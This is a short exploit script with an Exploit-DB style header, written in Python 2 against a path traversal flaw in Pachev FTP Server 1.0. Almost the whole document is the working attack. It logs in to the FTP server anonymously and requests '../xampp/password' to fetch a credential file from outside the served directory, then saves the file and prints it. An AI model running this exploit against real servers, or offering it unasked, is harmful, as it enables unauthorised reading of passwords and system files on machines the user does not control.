# Exploit Title: Pachev FTP Server 1.0 - Path Traversal
# Date: 2020-01-23
# Vulnerability: Path Traversal
# Exploit Author: 1F98D
# Vendor Homepage: https://github.com/pachev/pachev_ftp

from ftplib import FTP

ip = "10.10.10.10"
port = 21

ftp = FTP()
ftp.connect(host=ip, port=port)
ftp.login('anonymous', '')                   
ftp.retrbinary('RETR ../xampp/password', open('password', 'wb').write)
ftp.close()
file = open('password', 'r')
print "[**] Printing the contents of password.\n"
print file.read()